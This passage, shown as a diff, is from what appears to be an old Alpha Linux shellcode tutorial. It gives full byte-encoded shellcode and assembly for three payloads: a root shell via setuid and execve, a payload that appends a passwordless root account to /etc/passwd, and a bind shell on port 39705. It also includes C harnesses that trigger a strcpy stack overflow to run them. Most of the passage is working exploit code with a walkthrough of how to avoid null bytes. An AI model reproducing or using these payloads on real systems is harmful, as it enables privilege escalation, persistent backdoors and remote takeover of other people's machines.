+"\xf8\xff\x3f\xd1"                    /*   bsr      s0,CALLSYS    */
+"\x80\x74\xe7\x47"                    /*   cmoveq   zero,0x3b,v0 */
+"\x86\xfd\xfa\xb3"                    /*   stl      zero,-634(ra) */
+"\x7e\xfd\x1a\x22"                    /*   lda      a0,-642(ra)   */
+"\x91\x04\xff\x47"                    /*   cmoveq   zero,zero,a1 */
+"\x92\x04\xff\x47"                    /*   cmoveq   zero,zero,a2 */
+"\xf2\xff\x3f\xd1"                    /*   bsr      s0,CALLSYS    */
+;
+
+       The `data' in this shellcode is very important, so I will
+       show you the ASM. We will use the ASM while analyzing.
+
+.equ SYS_execve, 59
+
+.globl main
+.type main,@function
+
+main:
+
+.Lnot_to_use1:
+bsr $26, .Lwould_begin
+
+.Lwould_begin:
+# Address of our shellcode in register[ra]
+lda $26, 666($26)
+
+# Setup our palcode callsys routine
+stl $31, -653($26)
+
+# Load address of first syscall to be executed into s0 aka $9
+lda $9, -634($26)
+
+.Lcallsys:
+.ascii "\x83\xff\xff\xff"
+.ascii "\xff\xff\xff\xff"
+ret $31, ($9), 0x1
+
+# WE'RE GONNA STORE ALL THE DATA AFTER THIS RET!
+.ascii "/bin/ash"
+
+# SETUID
+# setuid(0)
+# SETUID
+cmoveq $31, 23, $0
+cmoveq $31, $31, $16
+
+bsr $9, .Lcallsys
+
+# EXECVE
+# execve("/bin/ash", 0, 0)
+# EXECVE
+cmoveq $31, 59, $0
+stl $31, -634($26)
+lda $16, -642($26)
+cmoveq $31, $31, $17
+cmoveq $31, $31, $18
+
+bsr $9, .Lcallsys
+
+        Note, please discard this instruction sequence, it was only
+        used for testing purposes:
+
+              .Lnot_to_use1:
+              bsr $26, .Lwould_begin
+
+              .Lwould_begin:
+
+        Now, if we expect our vulnerable program to return DIRECTLY
+        to the first instruction of our shellcode, it is only common
+        sense that the return address register will hold the address
+        of our first instruction (which is the address of the first
+        instruction on the stack).
+
+        So with that in mind, we load the return address back into
+        register ra, but we use a displacement of 666.
+
+              lda $26, 666($26)
+	      or
+
+	      lda ra, 666(ra)
+
+Remember loads and stores either need a large displacement
+or a negative displacement, so that they will not contain
+any NULL bytes. This is probably the most important element
+in our shellcode. Now we know exactly where we are, and where
+all of our valuable shellcode data is (such as the /bin/ash
+string).
+
+ The next instruction [stl zero,-653(ra)] sets up our
+ callsys instruction. It stores a longword zero just after the
+\x83 byte, which makes the instruction now \x00000083. The
+area it affects is here:
+
+           Before stl:
+           .ascii "\x83\xff\xff\xff"
+           .ascii "\xff\xff\xff\xff"
+
+           After stl:
+           .ascii "\x83\x00\x00\x00"
+           .ascii "\x00\xff\xff\xff"
+
+ Instruction translation :)
+
+           Before stl:
+           bgt     zero,0x120000018
+           bgt     zero,0x12000020c
+
+           After stl:
+           callsys
+           bgt     zero,0x11ffffe10
+
+ We see that the stl instruction [stl zero,-653(ra)]
+ effectively changed both instructions: the first was
+ changed to a callsys, the second was changed to a bgt.
+ More about bgt in a bit.
+
+The next instruction [lda $9, -634($26)] loads the address
+of the first syscall we want to execute into the s0 register.
+We will use the s0 register to branch back and forth between
+ our syscalls and the callsys instruction. The first syscall
+ we want to execute is the `setuid' syscall, so we load its
+address into s0:
+
+      # Load address of first syscall to be executed into s0 aka $9
+      lda $9, -634($26)
+
+ The next sequence does a lot, the next sequence looks like this
+ in the asm:
+
+           .Lcallsys:
+           .ascii "\x83\xff\xff\xff"
+           .ascii "\xff\xff\xff\xff"
+           ret $31, ($9), 0x1
+
+ This was effectively changed to:
+         callsys
+         bgt     zero,0x11ffffe10
+         ret $31, ($9), 0x1
+
+ The callsys will execute whatever syscall number is in register
+ v0. This is usually `0', so the instructions will continue, and
+ we will then execute our next instruction [bgt     zero,0x11ffffe10].
+ This is a branch greater than instruction, but what if it branches?
+ It won't. Let's refer back to my small instruction set reference:
+
+         bgt      BRANCH if registerA > ZERO
+
+ As you can see, registerA is register zero, and this will
+ always be `0', so the branch follows through to our next
+ instruction. Our next instruction is [ret $31, ($9), 0x1].
+ Remember how we loaded the address of our first syscall [SETUID]
+ into register s0? Well, this instruction branches to that
+ first system call. The ret instruction does not contain
+ any NULLs, so this is a great technique.
+
+ Ok, we have just executed the ret instruction, we successfully
+ skip all valuable shellcode data that is used in our syscalls,
+such as the /bin/ash string.
+
+Now we are at our first syscall [SETUID]. First we place the
+system call number of setuid into register v0 (r0), with a
+cmoveq instruction:
+
+      # SETUID
+      # setuid(0)
+      # SETUID
+      cmoveq $31, 23, $0
+
+Next, we place a `0' into register a0, which is the first
+argument to the setuid system call.
+
+      int setuid(uid_t uid)
+
+      We now have:
+
+      setuid(0)
+
+Notice the sequence of cmoveq instructions, they are conditional.
+ Conditional mov's contain no NULL bytes, so it is safe to
+ use these in our shellcode.
+
+ By the way, if you have not caught on, the reason the cmoveq
+ always succeeds is because it is checking to see if register
+ zero is equal to `0', and if so, it will succeed. Register zero
+ always contains `0'.
+
+ Up to this point, we have setup all information for the
+ SETUID syscall. The syscall number is in v0, an arg of `0' in a0,
+ now we must branch back to the {callsys,bgt ..., ret...}
+ instruction sequence. We store the updated pc (which is the address
+ of the next instruction to be executed, which is also the first
+ instruction of our next syscall [EXECVE]) into register s0 (r9).
+
+      bsr $9, .Lcallsys
+
+ The bsr instruction stores the updated pc into $9 (s0) and branches
+ back to the .Lcallsys instruction sequence.
+
+ Branching backwards has no NULLs. We branch back to the callsys
+ instruction, execute the SETUID syscall, once that is done, we
+ continue with the next instruction, which is the bgt instruction,
+ and we know this acts just like a nop. Now with the ret instruction
+ [ret $31, ($9), 0x1], we are returning to that updated PC which
+ is the first instruction of EXECVE syscall sequence. As you can see
+ we can repeat this process for 100's of syscalls.
+
+       Ok, we're back to the EXECVE instruction sequence:
+
+             # EXECVE
+             # execve("/bin/ash", 0, 0)
+             # EXECVE
+             cmoveq $31, 59, $0
+             stl $31, -634($26)
+             lda $16, -642($26)
+             cmoveq $31, $31, $17
+             cmoveq $31, $31, $18
+
+             bsr $9, .Lcallsys
+
+      In the instruction [cmoveq $31, 59, $0] we place the execve
+      system call number (59) into register v0 (r0).
+
+      Next, we store a longword zero [stl $31, -634($26)] just after
+      our /bin/ash string, this will NULL terminate the string. Also,
+      this store instructions, overwrites another instruction, the
+      instruction just after the /bin/ash string [cmoveq $31, 23, $0],
+      which is in the setuid instruction sequence. This doesn't matter
+      at all, since we have already executed the setuid syscall.
+
+      Now, we load [lda $16, -642($26)] the address of /bin/ash into
+      register a0. Execve now looks like so:
+
+             execve("/bin/ash", BLAH, BLAH)
+
+      The next two cmoveq instructions, place `0's into registers a1
+      and a2, these are the argv and env arguments to execve. Here
+      is what our execve looks like now:
+
+             execve("/bin/ash", NULL, NULL)
+
+      The final instruction [bsr $9, .Lcallsys] executes our execve
+      system call, and successfully executes the shell.
+
+      The next analysis of passwd shellcode is explained in exactly
+      the same way as the execve shellcode, if you understand the
+      execve shellcode method completely, feel free to jump to the
+      portshellcode section.
+
+      Next, we will go over the passwd appending shellcode. This shellcode
+      appends "x::0:0::/:/bin/sh\n" to /etc/passwd. The code is actually
+      108 bytes. In this shellcode, we have three syscalls:
+
+      * open
+      * write
+      * exit
+
+unsigned char alpha_passwd_shellcode[] =
+                                           /* XXX shellcode by andrew_darqui */
+
+"\x9a\x02\x5a\x23"                         /*   lda    ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                         /*   stl    zero,-653(ra) */
+"\xa2\xfd\x3a\x21"                         /*   lda    s0,-606(ra)   */
+"\x83\xff\xff\xff"                         /*   data                 */
+"\xff\xff\xff\xff"                         /*   data                 */
+"\x01\x80\xe9\x6b"                         /*   ret    zero,(s0),0x1 */
+"\x2f\x65\x74\x63"                         /*   data                 */
+"\x2f\x70\x61\x73"                         /*   data                   */
+"\x73\x77\x64\xff"                         /*   data                   */
+"\xff\xff\xff\x78"                         /*   data                   */
+"\x3a\x3a\x30\x3a"                         /*   data                   */
+"\x30\x3a\x3a\x2f"                         /*   data                   */
+"\x3a\x2f\x62\x69"                         /*   data                   */
+"\x6e\x2f\x73\x68"                         /*   data                   */
+"\x0a\xff\xff\xff"                         /*   data                   */
+"\x80\xb4\xe5\x47"                         /*   cmoveq   zero,0x2d,v0 */
+"\x7e\xfd\x1a\x22"                         /*   lda      a0,-642(ra)   */
+"\x89\xfd\xfa\xb3"                         /*   stl      zero,-631(ra) */
+"\x91\x54\xe1\x47"                         /*   cmoveq   zero,0xa,a1   */
+"\xef\xff\x3f\xd1"                         /*   bsr      s0, CALLSYS   */
+"\x90\x04\xe0\x47"                         /*   cmoveq   zero,v0,a0    */
+"\x80\x94\xe0\x47"                         /*   cmoveq   zero,0x4,v0   */
+"\x8d\xfd\x3a\x22"                         /*   lda      a1,-627(ra)   */
+"\x92\x54\xe2\x47"                         /*   cmoveq   zero,0x12,a2 */
+"\xea\xff\x3f\xd1"                         /*   bsr      s0, CALLSYS   */
+"\x80\x34\xe0\x47"                         /*   cmoveq   zero,0x1,v0   */
+"\xe8\xff\x3f\xd1"                         /*   bsr      s0, CALLSYS   */
+;
+
+        The `data' in this shellcode is very important, so I will
+        show you the ASM.
+
+.equ SYS_open, 45
+.equ SYS_write, 4
+
+
+.globl main
+.type main,@function
+
+
+main:
+
+.Lnot_used:
+bsr $26, .Lwould_begin
+
+.Lwould_begin:
+# Address of our shellcode in register[ra]
+lda $26, 666($26)
+
+
+# Setup our palcode callsys routine
+stl $31, -653($26)
+
+# Load address of first syscall to be executed into s0 aka $9
+lda $9, -606($26)
+
+.Lcallsys:
+.ascii "\x83\xff\xff\xff"
+.ascii "\xff\xff\xff\xff"
+ret $31, ($9), 0x1
+
+
+# WE'RE GONNA STORE ALL THE DATA AFTER THIS RET!
+
+# DATA FOR OPEN!
+.ascii "/etc/passwd"
+.ascii "\xff\xff\xff\xff"
+
+# DATA FOR WRITE!
+.ascii "x::0:0::/:/bin/sh\n\xff\xff\xff"
+# OPEN
+# fd = open("/etc/passwd", O_RDWR)
+# OPEN
+cmoveq $31, SYS_open, $0
+lda $16, -642($26)
+stl $31, -631($26)
+cmoveq $31, 0xa, $17
+
+bsr $9, .Lcallsys
+
+
+# WRITE
+# write(fd, "x::0:0::/:/bin/sh\n", stringlen)
+# WRITE
+cmoveq $31, $0, $16
+cmoveq $31, SYS_write, $0
+lda $17, -627($26)
+cmoveq $31, 18, $18
+
+bsr $9, .Lcallsys
+
+# EXIT
+# exit(anything!)
+# EXIT
+cmoveq $31, 1, $0
+
+bsr $9, .Lcallsys
+
+      Ignore this sequence please (It is for testing purposes):
+
+.Lnot_used:
+bsr $26, .Lwould_begin
+
+.Lwould_begin:
+
+      The first instruction [lda     ra,666(ra)] serves the same
+      exact purpose as that in the execve shellcode, it loads its
+      address+666 displacement back into ra so we can use negative
+      offsets to loads and stores.
+
+      The next instruction [stl     zero,-653(ra)] sets up our
+      callsys instruction. The area it affects is here:
+
+             Before stl:
+             .ascii "\x83\xff\xff\xff"
+             .ascii "\xff\xff\xff\xff"
+
+             After stl:
+             .ascii "\x83\x00\x00\x00"
+             .ascii "\x00\xff\xff\xff"
+
+      Instruction translation :)
+
+             Before stl:
+             bgt     zero,0x120000018
+             bgt     zero,0x12000020c
+
+             After stl:
+             callsys
+             bgt     zero,0x11ffffe10
+
+We see that the stl instruction [stl     zero,-653(ra)]
+effectively changed both instructions: the first was
+changed to a callsys, the second was changed to a bgt.
+More about bgt in a bit.
+
+The next instruction [lda     s0,-606(ra)] loads the address
+of the first syscall we want to execute, into the s0 register.
+We will use the s0 register to branch back and forth between
+our syscalls and the callsys instruction. The first syscall
+we want to execute is the open syscall, so we load its address
+into s0.
+
+      # Load address of first syscall to be executed into s0 aka $9
+      lda $9, -606($26)
+
+The next sequence does a lot, the next sequence looks like this
+in the asm:
+
+      .Lcallsys:
+      .ascii "\x83\xff\xff\xff"
+      .ascii "\xff\xff\xff\xff"
+      ret $31, ($9), 0x1
+
+This was effectively changed to:
+       callsys
+          bgt     zero,0x11ffffe10
+          ret $31, ($9), 0x1
+
+The callsys will execute whatever syscall number is in register
+v0. This is usually `0', so the instructions will continue, and
+we will then execute our next instruction [bgt     zero,0x11ffffe10].
+This is a branch greater than instruction, but what if it branches?
+It won't. Let's refer back to my small instruction set reference:
+
+      bgt     BRANCH if registerA > ZERO
+
+As you can see, registerA is register zero, and this will
+always be `0', so the branch follows through to our next
+instruction. Our next instruction is [ret $31, ($9), 0x1].
+Remember how we loaded the address of our first syscall [OPEN]
+into register s0? Well, this instruction branches to that
+first system call. The ret instruction does not contain
+any NULLs, so this is a great technique.
+
+Ok, we have just executed the ret instruction, we successfully
+skip all valuable shellcode data that is used in our syscalls,
+such as the file /etc/passwd, and the string we are appending to
+it.
+
+Now we are at our first syscall [OPEN]. First we move the
+open syscall number into register v0, with a cmoveq:
+
+      # OPEN
+      # fd = open("/etc/passwd", O_RDWR)
+      # OPEN
+      cmoveq $31, SYS_open, $0
+
+Next, we load /etc/passwd into register a0, and then
+store a longword zero to NULL terminate the string.
+
+      lda $16, -642($26)
+      stl $31, -631($26)
+We then place the value O_RDWR|O_APPEND into register a1.
+This is represented by the 0xa byte.
+
+      cmoveq $31, 0xa, $17
+
+Up to this point, we have setup all information for the
+syscall OPEN. The syscall number is in v0, args in a0 and a1,
+now we must branch back to the {callsys,bgt ..., ret...}
+instruction sequence. We store the updated pc (which is the address
+of the next instruction to be executed, which is also the first
+instruction of our next syscall [WRITE]).
+
+      bsr $9, .Lcallsys
+
+The bsr instruction stores the updated pc into $9 (s0) and branches
+back to the .Lcallsys instruction sequence.
+
+Branching backwards has no NULLs. We branch back to the callsys
+instruction, execute the OPEN syscall, once that is done, we
+continue with the next instruction, which is the bgt instruction,
+and we know this acts just like a nop. Now with the ret instruction
+[ret $31, ($9), 0x1], we are returning to that updated PC which
+is the first instruction of WRITE syscall sequence. As you can see
+we can repeat this process for 100's of syscalls.
+
+Ok, we're back to the WRITE instruction sequence:
+
+      # WRITE
+      # write(fd, "x::0:0::/:/bin/sh\n", stringlen)
+      # WRITE
+      cmoveq $31, $0, $16
+      cmoveq $31, SYS_write, $0
+      lda $17, -627($26)
+      cmoveq $31, 18, $18
+
+      bsr $9, .Lcallsys
+
+The [cmoveq $31, $0, $16] moves the FILE DESCRIPTOR returned by
+open into the a0 register. We then move the WRITE syscall number
+into register v0, load the passwd append string into a1,
+and cmoveq its length into register a2. Next we branch back, this
+will execute the WRITE syscall, and successfully append our
+string to the passwd file.
+
+      # EXIT
+      # exit(anything!)
+      # EXIT
+      cmoveq $31, 1, $0
+
+      bsr $9, .Lcallsys
+
+And the last instruction sequence, we move 0x1 to the v0 register
+and branch back. This executes the system call exit, which will
+flush data to disk if it has to. Notice how we don't put anything in
+register a0, it doesn't really matter with exit. We won't sigsegv.
+
+FINALLY! We are at the portshellcode. This portshellcode is
+164 bytes. I won't go over it, because it is exactly the same
+as the execve / passwd shellcode. A couple of notes about it:
+
+* The service is bound to port 39705
+* It executes /bin/ash (same reason for execve)
+unsigned char alpha_portshellcode[] = /* XXX shellcode by andrew_darqui */
+
+                                     /*   NOTE:    exec's ash    */
+"\x9a\x02\x5a\x23"                   /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                   /*   stl      zero,-653(ra) */
+"\x92\xfd\x3a\x21"                   /*   lda      s0,-622(ra)   */
+"\x83\xff\xff\xff"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x01\x80\xe9\x6b"                   /*   ret      zero,(s0),0x1 */
+"\xff\xff\x9b\x19"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x2f\x62\x69\x6e"                   /*   data                   */
+"\x2f\x61\x73\x68"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x80\x34\xec\x47"                   /*   cmoveq   zero,0x61,v0 */
+"\x90\x54\xe0\x47"                   /*   cmoveq   zero,0x2,a0   */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\xf3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x81\x04\xe0\x47"                   /*   cmoveq   zero,v0,t0    */
+"\x82\xfd\xfa\xb3"                   /*   stl      zero,-638(ra) */
+"\x80\x14\xed\x47"                   /*   cmoveq   zero,0x68,v0 */
+"\x90\x04\xe1\x47"                   /*   cmoveq   zero,t0,a0    */
+"\x7e\xfd\x3a\x22"                   /*   lda      a1,-642(ra)   */
+"\x92\x14\xe2\x47"                   /*   cmoveq   zero,0x10,a2 */
+"\xec\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x80\x54\xed\x47"                   /*   cmoveq   zero,0x6a,v0 */
+"\xe9\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xec\x47"                   /*   cmoveq   zero,0x63,v0 */
+"\xe7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x90\x04\xe0\x47"                   /*   cmoveq   zero,v0,a0    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\xe3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\xe0\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xe7\x47"                   /*   cmoveq   zero,0x3b,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\x86\xfd\x1a\x22"                   /*   lda      a0,-634(ra)   */
+"\x8e\xfd\xfa\xb3"                   /*   stl      zero,-626(ra) */
+"\xda\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+;
+
+      If you look through the shellcode, you will see it uses
+      8 syscalls.
+
+      It is important that you align your shellcode data section
+      (the section where you place strings and structures etc) to
+      a multiple of the instruction size (longword). If you don't,
+      you will receive SIGILL or SIGSEGV's.
+
+      Below I will give the test programs and ASM of all
+      shellcode shown.
+
+
++BEGIN execve_ash.s
+
+.equ SYS_execve, 59
+
+.globl main
+.type main,@function
+
+main:
+
+.Lnot_to_use1:
+bsr $26, .Lwould_begin
+
+.Lwould_begin:
+# Address of our shellcode in register[ra]
+lda $26, 666($26)
+
+# Setup our palcode callsys routine
+stl $31, -653($26)
+
+# Load address of first syscall to be executed into s0 aka $9
+lda $9, -634($26)
+
+.Lcallsys:
+.ascii "\x83\xff\xff\xff"
+.ascii "\xff\xff\xff\xff"
+ret $31, ($9), 0x1
+
+# WE'RE GONNA STORE ALL THE DATA AFTER THIS RET!
+.ascii "/bin/ash"
+
+# SETUID
+# setuid(0)
+# SETUID
+cmoveq $31, 23, $0
+cmoveq $31, $31, $16
+
+bsr $9, .Lcallsys
+
+# EXECVE
+# execve("/bin/ash", 0, 0)
+# EXECVE
+cmoveq $31, 59, $0
+stl $31, -634($26)
+lda $16, -642($26)
+cmoveq $31, $31, $17
+cmoveq $31, $31, $18
+
+bsr $9, .Lcallsys
+
++END execve_ash.s
+
+
++BEGIN execve_ash.c
+
+/* Sat Jul 1 02:00:23 GMT 2000
+ * Author:
+ *    andrew_darqui of someplace
+ * Notes:
+ *    executes /bin/ash makes it smaller
+ *    note, the return address should point to first instruction
+ * Length:
+ *    68 bytes!
+ *
+ * werd to the alpha
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned char alpha_exec_shellcode[] = /* XXX shellcode by andrew_darqui */
+
+                                         /*   NOTE:    exec /bin/ash */
+"\x9a\x02\x5a\x23"                       /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                       /*   stl      zero,-653(ra) */
+"\x86\xfd\x3a\x21"                       /*   lda      s0,-634(ra)   */
+"\x83\xff\xff\xff"                       /*   data     (callsys)     */
+"\xff\xff\xff\xff"                       /*   data     (bgt)         */
+"\x01\x80\xe9\x6b"                       /*   ret      zero,(s0),0x1 */
+"\x2f\x62\x69\x6e"                       /*   data                   */
+"\x2f\x61\x73\x68"                       /*   data                   */
+"\x80\xf4\xe2\x47"                       /*   cmoveq   zero,0x17,v0 */
+"\x90\x04\xff\x47"                       /*   cmoveq   zero,zero,a0 */
+"\xf8\xff\x3f\xd1"                       /*   bsr      s0,CALLSYS    */
+"\x80\x74\xe7\x47"                       /*   cmoveq   zero,0x3b,v0 */
+"\x86\xfd\xfa\xb3"                       /*   stl      zero,-634(ra) */
+"\x7e\xfd\x1a\x22"                       /*   lda      a0,-642(ra)   */
+"\x91\x04\xff\x47"                       /*   cmoveq   zero,zero,a1 */
+"\x92\x04\xff\x47"                       /*   cmoveq   zero,zero,a2 */
+"\xf2\xff\x3f\xd1"                       /*   bsr      s0,CALLSYS    */
+;
+
+
+#define BUFF_SIZE 16
+#define EXTRA    8
+#define RA       8
+
+signed int
+vuln_func(char *string)
+{
+    char            buffer[BUFF_SIZE];
+
+    strcpy(buffer, string);
+
+    return 0;
+}
+
+
+int
+main(int argc, char *argv[])
+{
+    unsigned long   saddr = (unsigned long) &alpha_exec_shellcode;
+    unsigned char *area = NULL;
+
+
+    printf("The address of our shellcode -> 0x%lx\n", saddr);
+
+    area = (unsigned char *) calloc(1, BUFF_SIZE + EXTRA + RA);
+    if (area == NULL) {
+        puts("main() : calloc() : Failed");
+        exit(-1);
+    }
+
+    memset(area, 'A'           /*
+                                * 0x41
+                                */ , (BUFF_SIZE + EXTRA));
+
+     *(unsigned long *) (area + BUFF_SIZE + EXTRA) = (unsigned long) saddr;
+
+     puts("Overwriting main()'s return address, should exec ash!");
+
+     vuln_func(area);
+
+     return 0;
+};
+
++END execve_ash.c
+
+
++BEGIN passwd.s
+
+.equ SYS_open, 45
+.equ SYS_write, 4
+
+
+.globl main
+.type main,@function
+
+
+main:
+
+.Lnot_used:
+bsr $26, .Lwould_begin
+
+.Lwould_begin:
+# Address of our shellcode in register[ra]
+lda $26, 666($26)
+
+
+# Setup our palcode callsys routine
+#cmoveq $31, 0x83, $1
+stl $31, -653($26)
+
+# Load address of first syscall to be executed into s0 aka $9
+lda $9, -606($26)
+
+.Lcallsys:
+.ascii "\x83\xff\xff\xff"
+.ascii "\xff\xff\xff\xff"
+ret $31, ($9), 0x1
+
+
+# WE'RE GONNA STORE ALL THE DATA AFTER THIS RET!
+
+# DATA FOR OPEN!
+.ascii "/etc/passwd"
+.ascii "\xff\xff\xff\xff"
+
+# DATA FOR WRITE!
+.ascii "x::0:0::/:/bin/sh\n\xff\xff\xff"
+
+
+# OPEN
+# fd = open("/etc/passwd", O_RDWR)
+# OPEN
+cmoveq $31, SYS_open, $0
+lda $16, -642($26)
+stl $31, -631($26)
+cmoveq $31, 0xa, $17
+
+bsr $9, .Lcallsys
+
+
+# WRITE
+# write(fd, "x::0:0::/:/bin/sh\n", stringlen)
+# WRITE
+cmoveq $31, $0, $16
+cmoveq $31, SYS_write, $0
+lda $17, -627($26)
+cmoveq $31, 18, $18
+
+bsr $9, .Lcallsys
+
+# EXIT
+# exit(anything!)
+# EXIT
+cmoveq $31, 1, $0
+
+bsr $9, .Lcallsys
+
++END passwd.s
+
+
++BEGIN passwd.c
+
+/* Sun Jul 2 09:49:52 GMT 2000
+ * Author:
+ *    andrew_darqui of someplace
+ * Notes:
+ *    write's "x::0:0::/:/bin/sh\n" to "/etc/passwd"
+ *    note, the return address should point to first instruction
+ * Length:
+ *    alpha_passwd_shellcode = 108 bytes
+ *
+ * werd to the alpha
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned char alpha_passwd_shellcode[] =
+                                           /* XXX shellcode by andrew_darqui */
+
+"\x9a\x02\x5a\x23"                         /*   lda    ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                         /*   stl    zero,-653(ra) */
+"\xa2\xfd\x3a\x21"                         /*   lda    s0,-606(ra)   */
+"\x83\xff\xff\xff"                         /*   data                 */
+"\xff\xff\xff\xff"                         /*   data                 */
+"\x01\x80\xe9\x6b"                         /*   ret    zero,(s0),0x1 */
+"\x2f\x65\x74\x63"                         /*   data                 */
+"\x2f\x70\x61\x73"                         /*   data                 */
+"\x73\x77\x64\xff"                         /*   data                 */
+"\xff\xff\xff\x78"                         /*   data                 */
+"\x3a\x3a\x30\x3a"                         /*   data                 */
+"\x30\x3a\x3a\x2f"                         /*   data                 */
+"\x3a\x2f\x62\x69"                         /*   data                 */
+"\x6e\x2f\x73\x68"                         /*   data                 */
+"\x0a\xff\xff\xff"                         /*   data                 */
+"\x80\xb4\xe5\x47"                       /*   cmoveq   zero,0x2d,v0    */
+"\x7e\xfd\x1a\x22"                       /*   lda      a0,-642(ra)     */
+"\x89\xfd\xfa\xb3"                       /*   stl      zero,-631(ra)   */
+"\x91\x54\xe1\x47"                       /*   cmoveq   zero,0xa,a1     */
+"\xef\xff\x3f\xd1"                       /*   bsr      s0, CALLSYS     */
+"\x90\x04\xe0\x47"                       /*   cmoveq   zero,v0,a0      */
+"\x80\x94\xe0\x47"                       /*   cmoveq   zero,0x4,v0     */
+"\x8d\xfd\x3a\x22"                       /*   lda      a1,-627(ra)     */
+"\x92\x54\xe2\x47"                       /*   cmoveq   zero,0x12,a2    */
+"\xea\xff\x3f\xd1"                       /*   bsr      s0, CALLSYS     */
+"\x80\x34\xe0\x47"                       /*   cmoveq   zero,0x1,v0     */
+"\xe8\xff\x3f\xd1"                       /*   bsr      s0, CALLSYS     */
+;
+
+
+#define BUFF_SIZE 16
+#define EXTRA     8
+#define RA        8
+
+signed int
+vuln_func(char *string)
+{
+    char            buffer[BUFF_SIZE];
+
+     strcpy(buffer, string);
+
+     return 0;
+}
+
+
+int
+main(int argc, char *argv[])
+{
+    unsigned long   saddr = (unsigned long) &alpha_passwd_shellcode;
+    unsigned char *area = NULL;
+
+
+     printf("The address of our shellcode -> 0x%lx\n", saddr);
+
+     area = (unsigned char *) calloc(1, BUFF_SIZE + EXTRA + RA);
+     if (area == NULL) {
+         puts("main() : calloc() : Failed");
+         exit(-1);
+     }
+
+     memset(area, 'A'           /*
+                                 * 0x41
+                                 */ , (BUFF_SIZE + EXTRA));
+
+     *(unsigned long *) (area + BUFF_SIZE + EXTRA) = (unsigned long) saddr;
+
+     puts("Overwriting main()'s return address, write to passwd file!");
+
+     vuln_func(area);
+
+     return 0;
+};
+
++END passwd.c
++BEGIN portshell_ash.s
+
+.equ   SYS_socket,97
+.equ   SYS_bind, 104
+.equ   SYS_listen,106
+.equ   SYS_accept,99
+.equ   SYS_dup2,90
+.equ   SYS_execve,59
+
+
+.globl main
+.type main,@function
+
+
+main:
+
+.Lnot_used:
+bsr $26, .Lwould_begin
+
+.Lwould_begin:
+# Address of our shellcode in register[ra]
+lda $26, 666($26)
+
+
+# Setup our palcode callsys routine
+stl $31, -653($26)
+
+
+# s0 aka $9 will be for return after the callsys..
+# this is the first branch to the rest of the portshell
+# to the first cmoveq after the ret ;)
+lda $9, -622($26)
+
+.Lcallsys:
+.ascii "\x83\xff\xff\xff"
+.ascii "\xff\xff\xff\xff"
+ret $31, ($9), 0x1
+
+# WE'RE GONNA STORE ALL THE DATA AFTER THIS RET!
+.ascii "\xff\xff\x9b\x19\xff\xff\xff\xff"
+#       family port     address
+
+# DATA FOR EXECVE! "/bin/ash\0!!!!!!!!"
+.ascii "/bin/ash\xff\xff\xff\xff"
+
+
+# SOCKET
+# fd = socket(AF_INET, SOCK_STREAM, 0)
+# SOCKET
+cmoveq $31, SYS_socket, $0
+cmoveq $31, 2, $16
+cmoveq $31, 1, $17
+cmoveq $31, $31, $18
+
+bsr $9, .Lcallsys
+
+
+# Save the fd
+cmoveq $31, $0, $1
+# BIND
+# bind(fd, { -1, 39705, INADDR_ANY }, sizeof(struct sockaddr_in))
+# BIND
+stl $31, -638($26)
+cmoveq $31, SYS_bind, $0
+cmoveq $31, $1, $16
+lda $17, -642($26)
+cmoveq $31, 16, $18
+
+bsr $9, .Lcallsys
+
+
+# LISTEN
+# listen(fd, 1)
+# LISTEN
+cmoveq $31, 1, $17
+cmoveq $31, SYS_listen, $0
+
+bsr $9, .Lcallsys
+
+
+# ACCEPT
+# nfd = accept(fd, NULL, NULL)
+# ACCEPT
+cmoveq $31, SYS_accept, $0
+
+bsr $9, .Lcallsys
+
+
+# Save NFD!
+cmoveq $31, $0, $16
+
+
+# DUP2
+# dup2(nfd, 0)
+# DUP2
+cmoveq $31, SYS_dup2, $0
+cmoveq $31, $31, $17
+
+bsr $9, .Lcallsys
+
+
+# DUP2
+# dup2(nfd, 1)
+# DUP2
+cmoveq $31, SYS_dup2, $0
+cmoveq $31, 1, $17
+
+bsr $9, .Lcallsys
+
+
+# EXECVE
+# execve("/bin/ash"...)
+# EXECVE
+cmoveq $31, SYS_execve, $0
+cmoveq $31, $31, $17
+cmoveq $31, $31, $18
+
+lda $16, -634($26)
+
+stl $31, -626($26)
+
+bsr $9, .Lcallsys
+# This file was not truncated, the end ;-)
+
++END portshell_ash.s
+
+
++BEGIN portshell_ash.c
+
+/* Sat Jul 1 02:00:23 GMT 2000
+ * Author:
+ *    andrew_darqui of someplace
+ * Notes:
+ *    note, the return address should point to first instruction
+ * testing out portshell!
+ *
+ * This spawns an /bin/ash shell on port 39705
+ *
+ * Length:
+ *    164 bytes! (i think this is small for alpha.. ;)
+ *
+ * werd to the alpha
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
